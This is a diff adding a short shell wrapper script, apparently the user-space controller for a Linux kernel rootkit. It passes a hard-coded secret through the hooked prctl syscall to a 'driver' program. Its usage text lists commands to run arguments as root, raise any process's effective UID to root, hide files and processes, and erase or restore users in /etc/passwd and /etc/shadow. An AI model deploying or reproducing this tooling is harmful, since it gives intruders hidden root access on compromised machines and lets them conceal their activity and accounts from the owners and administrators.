@@ -1,0 +1,33 @@
+#!/usr/bin/env sh
+# Copyright 2019 Bailey Defino
+# <https://bdefino.github.io>
+
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+# simple wrapper for the driver script
+# Usage: ./$0 COMMAND [ULONG | 0xHEXULONG | @CARRAY ...]
+# COMMAND
+#   module command to execute
+#     command ARGS -> execute the arguments as root
+#     drop PID -> set a process's EUID to its UID
+#     elevate PID -> set a process's EUID to root
+#     ghost UID -> remove a user from "/etc/passwd" and "/etc/shadow"
+#     hide PATH -> hide an entity ("/proc" paths are treated as processes)
+#     show PATH -> show a hidden entity ("/proc" paths are treated as processes)
+#     unghost UID -> replace a user in "/etc/passwd" and "/etc/shadow"
+[ -z "$1" ] && echo "Expected a command." >&2 && exit 1
+CALL=157 # `sys_prctl` is a good one for x86_64 Linux (just make sure the secret is > ~((int) 0)
+SECRET=0xDEADBEEFDEADBEEF
+./driver "${CALL}" "${SECRET}" $@
+
